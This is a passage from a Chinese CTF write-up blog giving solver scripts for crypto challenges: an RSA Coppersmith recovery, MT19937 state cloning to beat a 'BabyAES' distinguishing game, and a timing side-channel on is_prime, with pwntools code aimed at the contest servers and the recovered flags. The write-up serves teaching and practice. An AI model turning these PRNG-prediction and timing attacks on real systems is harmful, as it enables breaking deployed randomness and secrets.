i*(x-<span class="number">1</span>)*(n-x) - x*G</span><br><span class="line">    res = f.roots()</span><br><span class="line">    <span class="comment"># p高位</span></span><br><span class="line">    res = <span class="built_in">int</span>(res[-<span class="number">1</span>][<span class="number">0</span>]) &gt;&gt; <span class="number">230</span> &lt;&lt; <span class="number">230</span></span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g = res + y</span><br><span class="line">    ress = g.small_roots(X=<span class="number">2</span>^<span class="number">230</span>, beta=<span class="number">0.499</span>, epsilon=<span class="number">0.04</span>)</span><br><span class="line">    <span class="keyword">if</span>(ress != []):</span><br><span class="line">        <span class="built_in">print</span>(i, ress)</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="built_in">int</span>(ress[<span class="number">0</span>]) + res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ct, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n))))</span><br><span class="line"><span class="comment">#flag&#123;ec6f23afd0b7453bb8224146b6aad196&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="BabyAES"><a href="#BabyAES" class="headerlink" title="BabyAES"></a>BabyAES</h3><p>想来想去发现是一道随机数预测</p>
<p>第一次发一个超长然后盲猜1来获得这个随机数序列以进行后续预测</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(<span class="built_in">format</span>=<span class="string">&#x27;STT&gt; %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger()</span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line">SYMBOLIC_COUNTER = count()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Untwister</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line">        <span class="variable language_">self</span>.MT = [BitVec(<span class="string">f&#x27;MT_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line">        <span class="variable language_">self</span>.index = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.solver = Solver()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#This particular method was adapted from https://www.schutzwerk.com/en/43/posts/attacking_a_random_number_generator/</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">symbolic_untamper</span>(<span class="params">self, solver, y</span>):</span><br><span class="line">        name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line"></span><br><span class="line">        y1 = BitVec(<span class="string">f&#x27;y1_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        y2 = BitVec(<span class="string">f&#x27;y2_<span class="subst">&#123;name&#125;</span>&#x27;</span> , <span class="number">32</span>)</span><br><span class="line">        y3 = BitVec(<span class="string">f&#x27;y3_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        y4 = BitVec(<span class="string">f&#x27;y4_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        equations = [</span><br><span class="line">            y2 == y1 ^ (LShR(y1, <span class="number">11</span>)),</span><br><span class="line">            y3 == y2 ^ ((y2 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9D2C5680</span>),</span><br><span class="line">            y4 == y3 ^ ((y3 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xEFC60000</span>),</span><br><span class="line">            y == y4 ^ (LShR(y4, <span class="number">18</span>))</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        solver.add(equations)</span><br><span class="line">        <span class="keyword">return</span> y1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">symbolic_twist</span>(<span class="params">self, MT, n=<span class="number">624</span>, upper_mask=<span class="number">0x80000000</span>, lower_mask=<span class="number">0x7FFFFFFF</span>, a=<span class="number">0x9908B0DF</span>, m=<span class="number">397</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            This method models MT19937 function as a Z3 program</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        MT = [i <span class="keyword">for</span> i <span class="keyword">in</span> MT] <span class="comment">#Just a shallow copy of the state</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            x = (MT[i] &amp; upper_mask) + (MT[(i+<span class="number">1</span>) % n] &amp; lower_mask)</span><br><span class="line">            xA = LShR(x, <span class="number">1</span>)</span><br><span class="line">            xB = If(x &amp; <span class="number">1</span> == <span class="number">0</span>, xA, xA ^ a) <span class="comment">#Possible Z3 optimization here by declaring auxiliary symbolic variables</span></span><br><span class="line">            MT[i] = MT[(i + m) % n] ^ xB</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> MT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbolic</span>(<span class="params">self, guess</span>):</span><br><span class="line">        name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line">        ERROR = <span class="string">&#x27;Must pass a string like &quot;?1100???1001000??0?100?10??10010&quot; where ? represents an unknown bit&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">type</span>(guess) == <span class="built_in">str</span>, ERROR</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x <span class="keyword">in</span> <span class="string">&#x27;01?&#x27;</span>, guess)), ERROR</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(guess) &lt;= <span class="number">32</span>, <span class="string">&quot;One 32-bit number at a time please&quot;</span></span><br><span class="line">        guess = guess.zfill(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.symbolic_guess = BitVec(<span class="string">f&#x27;symbolic_guess_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        guess = guess[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(guess):</span><br><span class="line">            <span class="keyword">if</span> bit != <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                <span class="variable language_">self</span>.solver.add(Extract(i, i, <span class="variable language_">self</span>.symbolic_guess) == bit)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.symbolic_guess</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">self, guess</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            You need 624 numbers to completely clone the state.</span></span><br><span class="line"><span class="string">                You can input less than that though and this will give you the best guess for the state</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.index &gt;= <span class="number">624</span>:</span><br><span class="line">            name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line">            next_mt = <span class="variable language_">self</span>.symbolic_twist(<span class="variable language_">self</span>.MT)</span><br><span class="line">            <span class="variable language_">self</span>.MT = [BitVec(<span class="string">f&#x27;MT_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">                <span class="variable language_">self</span>.solver.add(<span class="variable language_">self</span>.MT[i] == next_mt[i])</span><br><span class="line">            <span class="variable language_">self</span>.index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        symbolic_guess = <span class="variable language_">self</span>.get_symbolic(guess)</span><br><span class="line">        symbolic_guess = <span class="variable language_">self</span>.symbolic_untamper(<span class="variable language_">self</span>.solver, symbolic_guess)</span><br><span class="line">        <span class="variable language_">self</span>.solver.add(<span class="variable language_">self</span>.MT[<span class="variable language_">self</span>.index] == symbolic_guess)</span><br><span class="line">        <span class="variable language_">self</span>.index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_random</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            This will give you a random.Random() instance with the cloned state.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        logger.debug(<span class="string">&#x27;Solving...&#x27;</span>)</span><br><span class="line">        start = time()</span><br><span class="line">        <span class="variable language_">self</span>.solver.check()</span><br><span class="line">        model = <span class="variable language_">self</span>.solver.model()</span><br><span class="line">        end = time()</span><br><span class="line">        logger.debug(<span class="string">f&#x27;Solved! (in <span class="subst">&#123;<span class="built_in">round</span>(end-start,<span class="number">3</span>)&#125;</span>s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Compute best guess for state</span></span><br><span class="line">        state = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: model[x].as_long(), <span class="variable language_">self</span>.MT))</span><br><span class="line">        result_state = (<span class="number">3</span>, <span class="built_in">tuple</span>(state+[<span class="variable language_">self</span>.index]), <span class="literal">None</span>)</span><br><span class="line">        r = Random()</span><br><span class="line">        r.setstate(result_state)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;task.py&#x27;</span>])</span><br><span class="line">ut = Untwister()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    ut.submit(<span class="string">&#x27;?&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;msg: &quot;</span>)</span><br><span class="line">sh.sendline(urandom(<span class="number">19968</span>//<span class="number">8</span>).<span class="built_in">hex</span>().encode())</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;ct:&quot;</span>)</span><br><span class="line">res = bytes_to_long(<span class="built_in">bytes</span>.fromhex(sh.recvline().strip().decode())[::-<span class="number">1</span>])</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;[+] &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">628</span>):</span><br><span class="line">    x = res &amp; <span class="number">0xffffffff</span></span><br><span class="line">    res &gt;&gt;= <span class="number">32</span></span><br><span class="line">    ut.submit(<span class="built_in">bin</span>(x)[<span class="number">2</span>:].zfill(<span class="number">32</span>))</span><br><span class="line">r2 = ut.get_random()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;msg: &quot;</span>)</span><br><span class="line">    r2.randbytes(<span class="number">16</span>)</span><br><span class="line">    temp = r2.randbytes(<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># print(bytes_to_long(temp))</span></span><br><span class="line">    sh.sendline()</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;ct:&quot;</span>)</span><br><span class="line">    res = <span class="built_in">bytes</span>.fromhex(sh.recvline().strip().decode())</span><br><span class="line">    <span class="comment"># print(bytes_to_long(res))</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;[+] &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res == temp):</span><br><span class="line">        sh.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br><span class="line">flag&#123;AES_15_S4f3_3n0ugh_but_MT19937_n07&#125;</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randbytes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;flag&#123;REDACTED&#125;&quot;</span></span><br><span class="line">pad = <span class="keyword">lambda</span> x: x+randbytes(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(os.urandom(<span class="number">16</span>), AES.MODE_CBC, iv=randbytes(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ROUND <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    msg = pad(<span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;msg: &quot;</span>)))</span><br><span class="line">    cts = [cipher.encrypt(msg), randbytes(<span class="built_in">len</span>(msg))]</span><br><span class="line">    <span class="comment"># 0 真实密文，1 随机字节</span></span><br><span class="line">    decision = os.urandom(<span class="number">1</span>)[<span class="number">0</span>]&amp;<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ct:&quot;</span>, cts[decision].<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">input</span>(<span class="string">&quot;[+] &quot;</span>) == <span class="built_in">str</span>(decision)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Congrats! 🚩 <span class="subst">&#123;FLAG&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>一共128轮挑战，每轮可以输入一段msg，并生成两个密文，一个是aes-cbc生成的密文，一个是随机生成与msg等长的串，随机选择一个密文返回给用户。然后用户输入0或1，也就是猜测密文是真实密文（0）还是随机字符串（1），猜对了则进入下一轮。连续猜对128轮打印flag。</p>
<p>random模块是利用MT19937 PRNG生成随机数，之前tfcctf有过一道相关题目，可知MT19937的初始state为624个32bit数字，也就是19968bit。当知道连续19968bit的MT19937输出值，就可以确定当前的state，从而预测下一个随机数。</p>
<p><a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/69eaef2e.html">2024-同济大学第二届网络安全新生赛CatCTF-wp-crypto | 糖醋小鸡块的blog</a></p>
<p>因此首先需要第一轮为随机生成的密文，才可以恢复MT19937内部state。注意每轮会利用pad进行填充，需要调整MT19937状态与服务器同步。注意MT19937生成的随机字节会按照小端序拼接。</p>
<p><a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/506fe59c.html">2025-N1CTF-junior-wp-crypto | 糖醋小鸡块的blog</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;60.205.163.215&quot;</span>, <span class="number">20778</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 盲猜第一轮为随机密文</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;msg: &quot;</span>)</span><br><span class="line"><span class="comment"># 后16字节会由服务器pad填充</span></span><br><span class="line">io.sendline(urandom(<span class="number">19968</span>//<span class="number">8</span>-<span class="number">16</span>).<span class="built_in">hex</span>().encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ct:&quot;</span>)</span><br><span class="line">res = bytes_to_long(<span class="built_in">bytes</span>.fromhex(io.recvline().strip().decode())[::-<span class="number">1</span>])</span><br><span class="line">io.recvuntil(<span class="string">b&quot;[+] &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">predictor = ExtendMT19937Predictor()</span><br><span class="line"><span class="comment"># 将第一轮获取的随机密文，每次取32位用来还原内部state</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    x = res &amp; <span class="number">0xffffffff</span></span><br><span class="line">    res &gt;&gt;= <span class="number">32</span></span><br><span class="line">    predictor.setrandbits(x, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">127</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;msg: &quot;</span>)</span><br><span class="line">    <span class="comment"># 调整MT19937内部状态，加上pad填充的状态，从而与服务器端同步</span></span><br><span class="line">    predictor.predict_getrandbits(<span class="number">16</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># 预测值</span></span><br><span class="line">    temp = predictor.predict_getrandbits(<span class="number">19968</span>)</span><br><span class="line">    io.sendline(urandom(<span class="number">19968</span>//<span class="number">8</span>-<span class="number">16</span>).<span class="built_in">hex</span>().encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;ct:&quot;</span>)</span><br><span class="line">    res = bytes_to_long(<span class="built_in">bytes</span>.fromhex(io.recvline().strip().decode())[::-<span class="number">1</span>])</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;[+] &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res == temp):</span><br><span class="line">        io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="comment"># flag&#123;AES_15_S4f3_3n0ugh_but_MT19937_n07&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="onelinecrypto"><a href="#onelinecrypto" class="headerlink" title="onelinecrypto"></a>onelinecrypto</h3><p>侧信道时间攻击</p>
<p>当异或结果为大素数时，<code>is_prime()</code>函数的执行时间会更长</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> crt, next_prime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">optimized_attack</span>(<span class="params">host=<span class="string">&#x27;60.205.163.215&#x27;</span>, port=<span class="number">38793</span>, batch_size=<span class="number">300</span></span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化连接和参数</span></span><br><span class="line">    io = remote(host, port)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;🌌 &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    N, pn, fn, an = <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">28</span>, desc=<span class="string">&quot;Recovering flag&quot;</span>):</span><br><span class="line">        <span class="comment"># 素数序列生成</span></span><br><span class="line">        pn = <span class="number">3</span> <span class="keyword">if</span> pn == <span class="number">1</span> <span class="keyword">else</span> next_prime(pn)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 每5次迭代重新连接避免超时</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            io = remote(host, port)</span><br><span class="line">            io.recvuntil(<span class="string">b&#x27;🌌 &#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 并行测试所有余数</span></span><br><span class="line">        spends = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(pn):</span><br><span class="line">            numbers = [(an + k * N + j * N * pn) &lt;&lt; <span class="number">256</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(batch_size)]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 批量发送和计时</span></span><br><span class="line">            payload = <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;num&#125;</span>\n&quot;</span> <span class="keyword">for</span> num <span class="keyword">in</span> numbers)</span><br><span class="line">            io.send(payload.encode())</span><br><span class="line">            </span><br><span class="line">            start = time()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(numbers)):</span><br><span class="line">                io.recvuntil(<span class="string">b&#x27;🌌 &#x27;</span>)</span><br><span class="line">            spends.append(time() - start)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 找到最快响应对应的余数（异或后为非素数）</span></span><br><span class="line">        k_min = spends.index(<span class="built_in">min</span>(spends))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># CRT更新</span></span><br><span class="line">        fn_new = -((an + k_min * N) &lt;&lt; <span class="number">256</span>) % pn</span><br><span class="line">        fn = <span class="built_in">int</span>(crt([fn, fn_new], [N, pn]))</span><br><span class="line">        an = (<span class="number">1</span> - fn) * <span class="built_in">pow</span>(<span class="number">1</span> &lt;&lt; <span class="number">256</span>, -<span class="number">1</span>, N * pn) % (N * pn)</span><br><span class="line">        N *= pn</span><br><span class="line">    </span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(fn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行攻击</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = optimized_attack(batch_size=<span class="number">250</span>)  <span class="comment"># 可调整批次大小</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Recovered flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>远端网络不太稳定，打远端建议多开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;$c4^Cr7=w!N&#125;</span><br></pre></td></tr></table></figure>

